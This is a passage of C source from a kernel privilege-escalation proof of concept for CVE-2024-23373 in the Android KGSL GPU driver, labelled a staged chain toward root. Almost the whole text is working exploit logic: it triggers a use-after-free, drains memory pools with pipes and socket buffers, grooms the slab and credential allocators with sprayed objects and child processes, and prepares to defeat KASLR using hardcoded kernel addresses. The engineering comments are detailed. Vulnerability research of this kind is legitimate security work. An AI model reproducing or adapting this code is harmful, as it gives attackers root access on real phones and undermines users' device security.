        logf = fopen("/data/local/tmp/23373_poc.log", "a");
    L("=== ZF8 CVE-2024-23373 PoC (SlideTest -> PhysRW -> Root staged chain) ===\n");
    wait_boot_settle();
    /* Preallocate and prefill the L2 eviction buffer while memory is still plentiful:
       faulting pages in after the spray hangs. */
    {
        void *tb = mmap(NULL, (size_t)16 << 20, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        if (tb != MAP_FAILED) {
            g_thrash_buf = (volatile uint64_t *)tb;
            memset(tb, 1, (size_t)16 << 20);   /* belt and braces: touch every page */
        } else {
            L("[!] thrash buf mmap failed errno=%d\n", errno);
        }
        void *sl = mmap(NULL, (size_t)256 << 10, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        if (sl != MAP_FAILED) {
            uint32_t *sw = (uint32_t *)sl;
            for (int i = 0; i < (256 << 10) / 4; i++) sw[i] = 0xd65f03c0u; /* ret */
            g_sled = (volatile uint32_t *)sl;
        }
    }

    {
        struct timespec ws0;
        clock_gettime(CLOCK_MONOTONIC, &ws0);
        pthread_t wtid;
        /* g_pkey_call_inflight lives on its own mmap page rather than in .bss: a GPU write
           inside the dangling window can alias a .bss page. */
        {
            void *kf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
            if (kf == MAP_FAILED) { L("[-] g_pkey_call_inflight mmap FAILED\n"); return 1; }
            memset(kf, 0, 0x1000);
            g_pkey_call_inflight_p = (volatile sig_atomic_t *)kf;
        }
        pthread_create(&wtid, NULL, watchdog_main, NULL);
        pthread_detach(wtid);
    }
    int uaf_mb = argc > 1 ? atoi(argv[1]) : 256;
    /* argv[2] is accepted but unused; the slot is reserved, so the positions
       after it must not shift. */
    race_iters = argc > 3 ? atoi(argv[3]) : 20000;
    /* In this mode the BMO spray is skipped: 240MB of it would consume the
       freed frames that the PTE spray needs. */
    int mode_phaseb = (argc > 4 && strcmp(argv[4], "phaseb") == 0);
    #define GP_INTER_MAX 4096
    static uint32_t gp_inter_ids[GP_INTER_MAX];
    int gp_inter_n = 0;
    /* An f2fs sync() here hung the device: the log stopped at this line and the
       phone hard-powered off. It stays off, and the line says so instead of
       printing "sync complete" for a call that returns immediately. */
    g_no_pressure_sync = 1;
    L("[*] pre-sync skipped: an f2fs sync() has hung this device\n");
    /* The command files survive a reboot and the server replays rootcmd from offset
       0, so a RESTORE_STUB left by the previous run writes kernel text that was
       never patched on this boot. A stale rootout is quieter and worse: it makes
       the root check pass with no chain behind it. Start clean. */
    unlink("/data/local/tmp/wdcmd");
    unlink("/data/local/tmp/rootcmd");
    unlink("/data/local/tmp/rootout");
    unlink("/data/local/tmp/rel_stub_done");
    if (uaf_mb != 256) { L("[-] UAF_SIZE is fixed at 256MB\n"); return 1; }
    int oomfd = open("/proc/self/oom_score_adj", O_WRONLY);
    if (oomfd >= 0) { write(oomfd, "-1000", 5); close(oomfd); }
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) { L("[-] open kgsl FAILED errno=%d\n", errno); return 1; }
    if (argc > 4 && strcmp(argv[4], "selftest") == 0) {
        int sr = safe_selftest();
        L("[+] selftest complete: %s\n", sr == 0 ? "PASS" : "FAIL");
        close(kgsl_fd);
        return sr == 0 ? 0 : 1;
    }
#if !V7_ENABLE_TRIGGER
    L("[!] trigger path disabled in this build after stale-page corruption evidence\n");
    close(kgsl_fd);
    return 2;
#endif

    /* CHURN is allocated after the race completes and before the free: an 8MB
       pre-trigger allocation makes the transient insert miss every time, and it
       would consume the freed frame the race depends on - the pool hands out
       its most recently freed block first, so that frame is the first to go. */
    /* 1. Trigger the dangling UAF. */
    if (trigger_dangling() != 0) { close(kgsl_fd); return 1; }
    /* Preallocate the forge pool now: low-bank pages are plentiful only before
       the spray. */
    {
        struct timespec tzn; clock_gettime(CLOCK_REALTIME, &tzn);
        uint64_t sb = (uint64_t)tzn.tv_sec ^ ((uint64_t)tzn.tv_nsec << 20)
                      ^ ((uint64_t)getpid() << 40) ^ 0xA5A55A5A5A5AULL;
        for (int fi = 0; fi < 4; fi++) {
            uint32_t fid = 0;
            if (gpuobj_alloc(4096, KGSL_MEMFLAGS_USE_CPU_MAP, &fid) != 0 || !fid)
                break;
            void *fu = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_SHARED, kgsl_fd, ((off_t)fid) << 12);
            if (fu == MAP_FAILED) { gpuobj_free(fid); break; }
            volatile uint64_t *fw = (volatile uint64_t *)fu;
            uint64_t s1 = sb * (fi + 1) * 2654435761ULL + fi;
            uint64_t s2 = (sb ^ 0x5DEECE66DL) * (fi + 3) + fi * 7919ULL;
            fw[0] = s1; fw[1] = s2;
            gpuobj_sync(fid, 0, 4096, KGSL_GPUMEM_CACHE_CLEAN);
            g_fids[fi] = fid; g_fus[fi] = fw; g_fs1[fi] = s1; g_fs2[fi] = s2;
            g_nfpre++;
        }
        L("[UMH] forge prealloc %d pages\n", g_nfpre); log_fsync();
    }


    if (argc > 4 && strcmp(argv[4], "raceonly") == 0) {
        L("[+] raceonly test mode: UAF established; pausing (P1-P5 not run)\n");
        uaf_pause();
    }
    {
        static const uint32_t churn_sizes[] = { 8, 2, 1 };   /* 8/2/1MB fallback */
        for (int cs = 0; cs < 3; cs++) {
            if (gpuobj_alloc((uint64_t)churn_sizes[cs] * 1024 * 1024, 0, &churn_id) == 0 && churn_id != 0) {
                CHURN_MB = churn_sizes[cs];
                break;
            }
        }
        if (churn_id == 0) { L("[!] CHURN alloc FAILED errno=%d\n", errno); uaf_pause(); }
        if (gpuobj_info(churn_id, &churn_g) != 0 || churn_g == 0) { L("[!] CHURN info FAILED\n"); uaf_pause(); }
        L("[+] CHURN: id=%u gpuaddr=0x%llx (%d MB) -- post-trigger\n", churn_id, (unsigned long long)churn_g, CHURN_MB);
        log_fsync();
    }
    mem_diag("after dangling");    L("=== 0b. pre-UAF object setup (after trigger, before P1; reverted because that layout change made P2 stall 3/3) ===\n");
    struct gpu_ctx_t g;
    if (setup_ib(&g) != 0) { L("[-] IB setup FAILED\n"); uaf_pause(); }
    if (setup_ib(&spare_g) != 0) { L("[-] spare IB setup FAILED\n"); uaf_pause(); }
    L("[+] spare IB: ctx=%u ib=0x%llx\n", spare_g.ctx, (unsigned long long)spare_g.ib_gpuaddr);
    /* Heartbeat keeps the GPU busy: going idle for 3s in a corrupted state
       collapses GPU power and the device dies. */
    if (setup_ib(&hb_g) == 0) {
        pthread_create(&hb_tid_g, NULL, hb_main, NULL);
        pthread_detach(hb_tid_g);
        hb_started = 1;
        L("[+] heartbeat started (prevents collapse): ctx=%u ib=0x%llx\n", hb_g.ctx, (unsigned long long)hb_g.ib_gpuaddr);
    } else {
        L("[!] heartbeat setup failed\n");
    }
    uint32_t dst_id = 0;
    /* Give DST a plain BMO: an SVM object here would take a region the trigger
       races on. */
    if (gpuobj_alloc(0x10000, 0, &dst_id) != 0 || dst_id == 0) { L("[-] DST alloc FAILED\n"); uaf_pause(); }
    void *dst_u = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, ((off_t)dst_id) << 12);
    if (dst_u == MAP_FAILED) { L("[-] DST mmap FAILED\n"); uaf_pause(); }
    uint64_t dst_g = 0; gpuobj_info(dst_id, &dst_g);
    L("[+] DST: id=%u user=%p gpuaddr=0x%llx\n", dst_id, dst_u, (unsigned long long)dst_g);
    if (gpu_control_check(&g, dst_id, dst_u, dst_g) != 0) { L("[!] pre-UAF control group FAIL\n"); uaf_pause(); }
    L("[+] pre-UAF control group PASS\n");
    /* Drain before spraying: the kgsl pool absorbs the freed frame, so without
       reclaim pressure the sprayed pages land in an orphan frame and the scan
       reads all zeros. */
    int mode_oob = (argc > 4 && strcmp(argv[4], "oobprobe") == 0);
    if (mode_phaseb || mode_oob) {
        L("=== 2.6' %s drain (pool absorbs freed frames; only after the drain are they reclaimed by arrays/data pages) ===\n",
          mode_oob ? "oobprobe" : "phaseb");
        {
            #define PRESS_CHUNK2 (256UL * 1024 * 1024)
            void *pr2[16];
            int n_pr2 = 0;
            for (int pi = 0; pi < 16; pi++) {
                void *p = mmap(NULL, PRESS_CHUNK2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                if (p == MAP_FAILED) { L("[!] pressure region %d mmap FAILED errno=%d\n", pi, errno); break; }
                madvise(p, PRESS_CHUNK2, MADV_NOHUGEPAGE);
                for (size_t off = 0; off < PRESS_CHUNK2; off += 4096)
                    *(volatile char *)((char *)p + off) = 0x44;
                pr2[n_pr2++] = p;
                long av2 = 0;
                FILE *mi = fopen("/proc/meminfo", "r");
                if (mi) { char ml[128];
                    while (fgets(ml, sizeof(ml), mi))
                        if (sscanf(ml, "MemAvailable: %ld kB", &av2) == 1) break;
                    fclose(mi); }
                L("[D] drain %d: %dMB avail=%ldMB\n", pi + 1, (pi + 1) * 256, av2 / 1024);
                /* oob mode drains harder, down to 300MB available, to reach the
                   migratetype fallback. */
                if (av2 && av2 < (mode_oob ? 300 : 1000) * 1024) break;
            }
            L("[*] holding the drain for 15s (shrinker drains the pool)...\n");
            sleep(15);
            mem_diag("after drain");
            for (int pi = 0; pi < n_pr2; pi++) {
                wait_clean_band();
                munmap(pr2[pi], PRESS_CHUNK2);
                usleep(100 * 1000);
            }
            mem_diag("after drain release");
        }
        log_fsync();
        goto phaseb_jump;
    }
    log_fsync();

    /* 2. Pressure: drain the pool. */
    /* 0. Pre-UAF GPU objects (IB, DST, spare), ready before the freed pages
       exist. */
    /* Pre-burn stays off: burning ~115K pages after the UAF eats the freed
       frame from the top of the pool, so the kmalloc-256 slab never reaches it.
       The freed frame has to stay at the top of that LIFO for anything to
       hit. */
    L("=== 2.5 pre-burn: SKIP (preburn consumes freed pages) ===\n");
    mem_diag("after pre-burn(SKIP)");
    /* Skip the bounded sentinel here: the masquerade write would overwrite the
       window. */
    if (!mode_phaseb) {
        wait_clean_band();
        /* No pre-write here: the pool zeroes it, and the GPU write panicked
           twice on recycled page tables. */
    } else {
        L("[*] phaseb: skipping the bounded-pre-P2 sentinel\n");
    }
    log_fsync();


    L("=== 2.6 pool drain pressure (anon until avail<1000MB, hold 2s) ===\n");
    {
        #define PRESS_CHUNK (256UL * 1024 * 1024)
        void *pr[16];
        int n_pr = 0;
        for (int pi = 0; pi < 16; pi++) {
            void *p = mmap(NULL, PRESS_CHUNK, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (p == MAP_FAILED) { L("[!] pressure region %d mmap FAILED errno=%d\n", pi, errno); break; }
            madvise(p, PRESS_CHUNK, MADV_NOHUGEPAGE);
            for (size_t off = 0; off < PRESS_CHUNK; off += 4096)
                *(volatile char *)((char *)p + off) = 0x44;
            pr[n_pr++] = p;
            long av2 = 0;
            FILE *mi = fopen("/proc/meminfo", "r");
            if (mi) {
                char ml[128];
                while (fgets(ml, sizeof(ml), mi))
                    if (sscanf(ml, "MemAvailable: %ld kB", &av2) == 1) break;
                fclose(mi);
            }
            L("[D] pressure %d: %dMB, avail=%ldMB\n", pi + 1, (pi + 1) * 256, av2 / 1024);
            if (av2 && av2 < (mode_oob ? 300 : 1000) * 1024) break;   /* drain harder in oob mode */
        }
        L("[*] holding pressure for 2s (measured shrinker pool drain is <2s; 5s -> 2s)...\n");
        sleep(2);
        mem_diag("after pressure");
        /* Release one 256MB chunk at a time, each behind a clean-band gate:
           unmapping all 4GB in one burst upsets the buddy freelist. The order
           is reversed because the freelist is LIFO and the reclaim path takes
           from the head, so the chunk released last is the one the UNMOVABLE
           fallback will pick. A bias, not a guarantee. */
        for (int pi = n_pr - 1; pi >= 0; pi--) {
            wait_clean_band();
            munmap(pr[pi], PRESS_CHUNK);
            usleep(10 * 1000);   /* 10ms compromise between chunks, one clean-band gate each */
        }
        mem_diag("after pressure release");
    }
    log_fsync();

        /* The long pressure hold is gone: the pool does not drain on this
           device, and the UAF goes off within about 30s, so the hold would
           outlive it. */
    L("=== 2. P1: SKIP (removed; time after the UAF is the critical resource) ===\n");
    {
        /* Minimal pressure: touch and release 512MB so its pages go back to
           the buddy allocator for the spray that follows. */
        void *q = mmap(NULL, 512UL*1024*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (q != MAP_FAILED) {
            madvise(q, 512UL*1024*1024, MADV_NOHUGEPAGE);
            for (size_t off = 0; off < 512UL*1024*1024; off += 4096)
                *(volatile char *)((char*)q + off) = 0x44;
            munmap(q, 512UL*1024*1024);
        }
        mem_diag("after P1 (quick pressure)");
    }

    #define MAX_HITS 8192
    static uint32_t hit_ids[MAX_HITS];
    static int hit_pages[MAX_HITS];
    static int hit_slots[MAX_HITS];
    g_rel_hit_ids = hit_ids; g_rel_hit_pages = hit_pages; g_rel_hit_slots = hit_slots;
    int n_hits = 0;
    /* Health check: abort when MemAvailable falls below 500MB. */
    {
        FILE *f = fopen("/proc/meminfo", "r");
        uint64_t mfree=0, avail=0;
        char line[128];
        if (f) {
            while (fgets(line, sizeof(line), f)) {
                if (sscanf(line, "MemFree: %llu kB", (unsigned long long*)&mfree)==1) continue;
                if (sscanf(line, "MemAvailable: %llu kB", (unsigned long long*)&avail)==1) continue;
            }
            fclose(f);
        }
        FILE *f2 = fopen("/proc/meminfo", "r");
        uint64_t krecl=0, srecl=0;
        char line2[128];
        if (f2) {
            while (fgets(line2, sizeof(line2), f2)) {
                if (sscanf(line2, "KReclaimable: %llu kB", (unsigned long long*)&krecl)==1) continue;
                if (sscanf(line2, "SReclaimable: %llu kB", (unsigned long long*)&srecl)==1) continue;
            }
            fclose(f2);
        }
        int64_t proxy = ((int64_t)krecl - (int64_t)srecl) / 1024;
        L("[D] health check: MemFree=%lluMB avail=%lluMB proxy=%lldMB\n",
            (unsigned long long)(mfree/1024), (unsigned long long)(avail/1024), (long long)proxy);
        /* MemAvailable, not MemFree: the page cache of a quiet boot makes
           MemFree read low. */
        if (avail < 500L*1024) { L("[!] MemAvailable<500MB; high-risk abort (pause to preserve the device)\n"); uaf_pause(); }
        /* No upper bound on available memory: a run with 4GB free still
           produced hits. */
        if (proxy < 150) {
            /* A shallow proxy is not a failure: it measures how much has
               already been drained, and a drained pool is what brings the
               freed frame back within reach. */
            L("[!] proxy=%lldMB<150; warning only (pool already drained)\n", (long long)proxy);
        }
        /* Probe: a large object tree shows up as slow allocation; 15ms on
           average aborts the run. */
        {
            struct timespec t0, t1;
            uint64_t tot = 0;
            for (int pr = 0; pr < 16; pr++) {
                uint32_t pid2 = 0;
                clock_gettime(CLOCK_MONOTONIC, &t0);
                WD_START(30);
                int ar2 = gpuobj_alloc(0x1000, 0, &pid2);
                WD_STOP();
                clock_gettime(CLOCK_MONOTONIC, &t1);
                if (ar2 == 0 && pid2 != 0) {
                    tot += (uint64_t)(t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_nsec - t0.tv_nsec) / 1000;
                    gpuobj_free(pid2);
                }
            }
            if (tot / 16 > 15000) {
                L("[!] probe avg %llu us >15ms; tree too large, abort (pause to preserve the device)\n", (unsigned long long)(tot / 16));
                uaf_pause();
            }
            L("[+] probe avg %llu us; OK\n", (unsigned long long)(tot / 16));
        }
    }

    /* Warm the driver's hot path with 200 dummy alloc/free pairs, so the later
       reuse does not land on the freed frame. */
    L("=== 2.8 L3 warm-up (200 dummy) ===\n");
    wait_clean_band();   /* hold the window gate before the warm-up submits */
    {
        for (int d = 0; d < 200; d++) {
            uint32_t did = 0;
            if (gpuobj_alloc(0x1000, 0, &did) == 0 && did != 0)
                gpuobj_free(did);
        }
        L("[+] L3 warm-up complete\n");
    }


    /* Groom burst: 256 64KB objects, so the hot pages[] slab is likely to sit
       next to the pages[] of the entries the spray creates. */
    if (mode_oob) {
        for (int gi = 0; gi < 256; gi++) {
            uint32_t gid = 0;
            if (gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP, &gid) == 0 && gid != 0) {
                if (gp_inter_n < GP_INTER_MAX) gp_inter_ids[gp_inter_n++] = gid;
                else gpuobj_free(gid);
            }
        }
        L("[D] groom burst after drain: %d\n", gp_inter_n);
        log_fsync();
    }
    /* UNMOVABLE pressure. Empty the UNMOVABLE freelist so that growth of the
       kmalloc-512 slab has to fall back to stealing MOVABLE page blocks, which
       is how it lands in the frame we want. The pressure is released before the
       spray: held any longer, its skbs occupy the very frames the window points
       at and the spray has nothing to claim. */
    {
        FILE *uqf = fopen("/proc/sys/net/unix/max_dgram_qlen", "r");
        int uqv = -1;
        if (uqf) { if (fscanf(uqf, "%d", &uqv) != 1) uqv = -1; fclose(uqf); }
        L("[D] upr recon: unix.max_dgram_qlen=%d\n", uqv);
        static char upr_buf[32768], upr_dg[16384];   /* 32KB per write: batching cuts the syscall count */
        memset(upr_buf, 0x50, sizeof(upr_buf));
        memset(upr_dg, 0x53, sizeof(upr_dg));
        /* Fill 600 pipes with 1MB each and hold them: pipe pages are order-0
           UNMOVABLE. */
        #define UPR_NPIPES 600
        int (*upr_pp)[2] = malloc(sizeof(int[2]) * UPR_NPIPES);
        int upr_np = 0;
        long upr_pipe_kb = 0;
        if (upr_pp) {
            wait_clean_band();
            for (int i = 0; i < UPR_NPIPES; i++) {
                if (pipe(upr_pp[i]) != 0) break;
                if (fcntl(upr_pp[i][0], 1031, 1048576) < 0) {
                    close(upr_pp[i][0]); close(upr_pp[i][1]); continue;
                }
                for (int w = 0; w < 32; w++) {   /* 32KB x 32 = 1MB per pipe; fcntl already sized the pipe, so no write blocks */
                    if (write(upr_pp[i][1], upr_buf, 32768) != 32768) break;
                    upr_pipe_kb += 32;
                }
                upr_np++;
            }
            L("[D] upr/h1 pipes: %d pipes x 1MB = %ldMB held as UNMOVABLE\n",
              upr_np, upr_pipe_kb / 1024);
            log_fsync();
        }
        /* The same trick with socketpair send buffers: the queued skbs are
           UNMOVABLE too. */
        #define UPR_NPAIRS 4000
        #define UPR_SNDBUF 212992
        #define UPR_DGRAM  16384
        #define UPR_CAP_KB (850L * 1024)
        int (*upr_sv)[2] = malloc(sizeof(int[2]) * UPR_NPAIRS);
        int upr_nq = 0;
        long upr_q_kb = 0;
        if (upr_sv) {
            wait_clean_band();
            for (int i = 0; i < UPR_NPAIRS && upr_q_kb < UPR_CAP_KB; i++) {
                if (socketpair(AF_UNIX, SOCK_DGRAM, 0, upr_sv[i]) != 0) break;
                int usz = UPR_SNDBUF;
                setsockopt(upr_sv[i][0], SOL_SOCKET, SO_SNDBUF, &usz, sizeof(usz));
                setsockopt(upr_sv[i][1], SOL_SOCKET, SO_SNDBUF, &usz, sizeof(usz));
                int ufl = fcntl(upr_sv[i][0], F_GETFL);
                fcntl(upr_sv[i][0], F_SETFL, ufl | O_NONBLOCK);
                for (int q = 0; q < 64; q++) {
                    if (write(upr_sv[i][0], upr_dg, UPR_DGRAM) != UPR_DGRAM) break;
                    upr_q_kb += 16;
                }
                upr_nq++;
            }
            L("[D] upr/h2 sockets: %d pairs, backlog %ldMB\n", upr_nq, upr_q_kb / 1024);
            log_fsync();
        }
        /* A short datagram burst: consume what is left in the per-CPU stock,
           then release it all at once. */
        {
            wait_clean_band();
            long burst_kb = 0;
            for (int i = 0; i < 256; i++) {
                int ubsv[2];
                if (socketpair(AF_UNIX, SOCK_DGRAM, 0, ubsv) != 0) break;
                int usz = UPR_SNDBUF;
                setsockopt(ubsv[0], SOL_SOCKET, SO_SNDBUF, &usz, sizeof(usz));
                int ufl = fcntl(ubsv[0], F_GETFL);
                fcntl(ubsv[0], F_SETFL, ufl | O_NONBLOCK);
                for (int q = 0; q < 64; q++) {
                    if (write(ubsv[0], upr_dg, UPR_DGRAM) != UPR_DGRAM) break;
                    burst_kb += 16;
                }
                close(ubsv[0]); close(ubsv[1]);
            }
            L("[D] upr/h3 dgram short burst: %ldMB momentary\n", burst_kb / 1024);
            log_fsync();
        }
        /* Release the pressure before the spray. The census read 66% of the
           dangling window back as the datagram filler: those skbs sit on the very
           frames the window points at, so holding them hides the window from the
           spray. Dropping them puts those frames back on the free list where the
           spray can claim them. */
        if (upr_sv) {
            for (int i = 0; i < upr_nq; i++) { close(upr_sv[i][0]); close(upr_sv[i][1]); }
            free(upr_sv);
        }
        if (upr_pp) {
            for (int i = 0; i < upr_np; i++) { close(upr_pp[i][0]); close(upr_pp[i][1]); }
            free(upr_pp);
        }
        L("[D] pressure released: %d socket pairs, %d pipes\n", upr_nq, upr_np);
        mem_diag("after pressure release");
        log_fsync();
    }
    L("=== 3. P2: direct adaptive spray (no preburn/burn; freed pages stay at the LIFO head) ===\n");
    #define MAX_SPRAY_ENTRIES 69632   /* 17 x 4096 entries, so the last probe is past DANGLING_PAGES (65539) */
    static uint32_t spray_ids[MAX_SPRAY_ENTRIES];
    g_rel_spray_ids = spray_ids;
    int n_sprayed = 0;
    /* A credential is only reachable once it is back in the cred_jar and the
       partial slab it came from has its free list pointing into the dangling
       frame, so that window only opens after the spray. The running process's
       own credential is referenced for as long as it lives and can never land
       there. */
    /* Wave A, after the UNMOVABLE hold and before the spray: with the window
       frame held as one large chunk, the steal-largest path of slab growth is
       at its most likely to land inside it. */
    spawn_burn_wave(BURN_WAVE_A);
    L("[BURN] wave A: %d children (comm=burnNN)\n", n_burn);
    log_fsync();
    int probe_hits = 0;
    {
        /* Adaptive spray: allocate one at a time, watch the average latency for
           a tree that has grown too large, and scan the window every 4096
           entries. */
        {
            int probe_cnt = 0;
            double ema_us = 0.0; int ema_n = 0;
            struct timespec pt0, pt1;
            wait_clean_band();   /* window gate at the start of the spray */
            while (n_sprayed < MAX_SPRAY_ENTRIES && probe_hits == 0) {
                uint32_t sid = 0;
                clock_gettime(CLOCK_MONOTONIC, &pt0);
                WD_START(15);
                int ar = gpuobj_alloc(0x1000, 0, &sid);
                WD_STOP();
                clock_gettime(CLOCK_MONOTONIC, &pt1);
                if (ar != 0 || sid == 0) { L("[!] spray stopped at %d errno=%d\n", n_sprayed, errno); break; }
                spray_ids[n_sprayed++] = sid;
                {
                    double d = (double)(pt1.tv_sec - pt0.tv_sec) * 1e6 + (double)(pt1.tv_nsec - pt0.tv_nsec) / 1e3;
                    if (ema_n == 0) ema_us = d; else ema_us = 0.875 * ema_us + 0.125 * d;
                    ema_n++;
                    if (ema_n >= 8 && ema_us > 15000.0) {
                        L("[!] mid-spray EMA %.0f us >15ms; tree too large, abort (pause to preserve the device)\n", ema_us);
                        uaf_pause();
                    }
                }
                probe_cnt++;
                /* Interleave a groom object every 16 entries, so real pages[]
                   pointers land beside the victim array in the kmalloc-128
                   neighbourhood and an out-of-bounds walk finds live objects
                   more often. */
                if (mode_oob && (n_sprayed & 15) == 15) {
                    uint32_t gid = 0;
                    if (gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP, &gid) == 0 && gid != 0) {
                        if (gp_inter_n < GP_INTER_MAX) gp_inter_ids[gp_inter_n++] = gid;
                        else gpuobj_free(gid);
                    }
                }
                if (probe_cnt >= 4096) {
                    probe_cnt = 0;
                    { struct timespec rs2; clock_gettime(CLOCK_MONOTONIC, &rs2); g_wd_round = (long long)rs2.tv_sec; }
                    /* Read-only detection in place of write-then-scan. With no
                       GPU writes there is no page-table pollution, so the entry
                       budget needs no graded growth and the window needs no
                       blind rescue: every round scans all DANGLING_PAGES
                       pages, 8 slots each. */
                    L("[D] P2 %d entries; ROSCAN read-only probe (full window %d pages x 8 slots)\n",
                      n_sprayed, (int)DANGLING_PAGES);
                    wait_clean_band();
                    /* The blind write is reachable only through a value that
                       is non-empty and not "0": getenv() returning the string
                       "0" is still non-NULL, so testing for mere existence
                       would take the legacy path and leave a marker that the
                       size check then rejects. */
                    const char *lg = getenv("LEGACY_BLIND_WRITE");
                    if (lg && lg[0] && lg[0] != '0')
                        legacy_blind_write(&g, (int)DANGLING_PAGES);
                    {
                        int nh_r = scan_window_readonly(&g, dst_id, dst_u, dst_g, spray_ids, n_sprayed,
                                            hit_ids, hit_pages, hit_slots, 8192, (int)DANGLING_PAGES);
                        if (nh_r > 0) probe_hits = nh_r;
                        L("[D] hits after ROSCAN probe %d\n", probe_hits);
                        g_rel_nh = probe_hits; g_rel_nsprayed = n_sprayed;
                        log_fsync();
                    }
                }
            }
            L("[D] spray finished: %d entries, %d hits\n", n_sprayed, probe_hits);
            log_fsync();
        }
    }
    /* Drop credentials into the window: the cred_jar free list already points
       into the freed page, and each short-lived child forces prepare_creds()
       to allocate a fresh credential that put_cred() then releases back into
       that window. Nothing here touches the uid field, so a released slot
       still scans with the normal 2000 signature; a slot later reused by a
       live child carries its root. */
    {
        void *cst = mmap(NULL, 16384, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        int dropped = 0;
        if (cst != MAP_FAILED) {
            for (int ci = 0; ci < 400; ci++) {
                pid_t c = clone(cred_drop_child, (char *)cst + 8192,
                                CLONE_VM | SIGCHLD, NULL);
                if (c < 0) break;
                dropped++;
                int st2 = 0;
                waitpid(c, &st2, 0);
            }
            munmap(cst, 16384);
        }
        L("[CHURN2] short-lived children swapped/dropped %d credentials (more cred_jar slot churn inside the window)\n",
          dropped);
        log_fsync();
    /* Staged budget: the watchdog fires 30s after the last feed, so a block
       that runs longer than that has to feed it again. */
    }
    L("[+] P2 complete: %d entries (%d hits)\n", n_sprayed, probe_hits);
    log_fsync();
    /* Wave B: the frames that already hold a hit are inside the window, so new
       task and credential objects append into slabs that are already there
       instead of waiting on steal probability. */
    {
        int nb0 = n_burn;
        spawn_burn_wave(BURN_WAVE_B);
        L("[BURN] wave B: +%d children (total %d)\n", n_burn - nb0, n_burn);
        log_fsync();
    }
    /* 800 parked children each hold a fresh credential, forcing the cred_jar
       to grow new slab pages while the largest free block sits on the window
       side. The parent then takes the newest slots: its own credential is the
       only one worth patching, and every burn child shares it. The children
       stay parked until the verdict so their pages are not reclaimed
       mid-scan. */
    /* Pin the parent to one CPU so every task_struct steal below hits the same
       per-CPU slab and buddy state, the same pattern as _storm_core();
       drifting between CPUs is a source of run-to-run variance. */
    {
        cpu_set_t pin;
        CPU_ZERO(&pin);
        CPU_SET(0, &pin);
        if (sched_setaffinity(0, sizeof(pin), &pin) == 0)
            L("[PIN] fork parent pinned to CPU0 (slab steal consistency)\n");
        log_fsync();
    }
    /* The fast path never reads these children and they cost 800 processes
       plus about a million wakeups an hour; a single-variable A/B showed no
       change in the success rate, so the gate stays. Every PKEY_HIJACK_ONLY site tests
       getenv() for existence, so =0 and =1 are equivalent and an empty value
       still turns it on. park_release() cannot stop them either: the clone
       inherits its own write end and ignores SIGTERM/SIGHUP, so only SIGKILL
       works and they outlive the run. */
    if (getenv("PKEY_HIJACK_ONLY")) {
        L("[PARK] skipping the 800 credential-in-window parked children (PKEY_HIJACK_ONLY fast path does not need SWEEP)\n");
    } else {
        cred_burst(800, 1);
    }
    /* Wave C: after the spray and the credential burst the largest free block
       is at its most window-side, and the warm objects in task_struct_cachep
       are used up, so these forks must grow new slab pages and steal-largest
       drops them in the window. */
    {
        int nb0 = n_burn;
        spawn_burn_wave(BURN_WAVE_C);
        L("[BURN] wave C: +%d children (total %d)\n", n_burn - nb0, n_burn);
        log_fsync();
    }
    /* Wave R: 64 more independent order-3 steals at the same window-biased
       moment, which a single comm scan later covers together with the earlier
       waves. */
    {
        int nb0 = n_burn;
        spawn_burn_wave(BURN_WAVE_R);
        L("[BURN] wave R: +%d children (total %d)\n", n_burn - nb0, n_burn);
        log_fsync();
    }


    /* Validate a live entry, then derive the KASLR delta. The info ioctl is
       ground truth, so a candidate is checked field by field: size against
       the 0x1000 every spray entry asked for, gpuaddr and flags against the
       ioctl. Only a fully validated entry makes its ops pointer at +0x48
       worth reading, and delta = ops - kgsl_pool_ops(link). The remaining
       fields are read to classify which address space the page belongs to.
       Nothing here writes memdesc. */
    {
        int mode_st   = (argc > 4 && strcmp(argv[4], "slidetest") == 0);
        int mode_rw   = (argc > 4 && strcmp(argv[4], "physrw") == 0);
        int mode_root = (argc > 4 && strcmp(argv[4], "root") == 0);
        /* Root verdict state, declared once here for the whole staged block
           below. */
        int rooted = 0, main_rooted = 0, burn_win_child = -1, perm_win = 0;
        #define ST_POOL_OPS_LINK   0xffffffc01215d3a8ULL
        #define ST_CONTIG_LINK     0xffffffc01215d308ULL
        #define ST_TEXT_LINK       0xffffffc010080000ULL
        #define ST_MODPROBE_LINK   0xffffffc012b08e48ULL
        #define ST_SELINUX_LINK    0xffffffc012cac000ULL
        #define IMAGE_PA           0x90080000ULL
        #define PA_OF(link)        (IMAGE_PA + ((link) - ST_TEXT_LINK))
        static uint64_t pt_leak = 0;   /* linear VA of the victim page table, leaked for the scan to pair up */
        struct gpu_ctx_t st_g = {0};
        /* Validate up to 8 candidates, newest first. ep is a leftover IOVA of
           the freed mapping: its backing pages are already back in the
           allocator, and the credential churn plus the burn waves take about
           3.5MB between the scan and this read. When that lands on a candidate
           both copy channels report success and read back zeros, so the page
           really is zero - not a channel bug and not a cache race. hit_pages
           is filled in scan order, so the newest candidate is the one least
           likely to have been overwritten. */
        int nr = probe_hits < 8 ? probe_hits : 8;
        int n_sz_ok = 0, n_gpa_ok = 0, n_flg_ok = 0, n_full = 0;
        uint64_t ops_cand[16]; int n_ops_cand = 0;
        uint32_t v_ids[8]; uint64_t v_eps[8]; int nv_v = 0;
        L("=== SLIDETEST (%s): %d hits; dual-channel self-validation ===\n",
          mode_st ? "diag" : (mode_rw ? "physrw" : "ROOT"), nr);
        log_fsync();
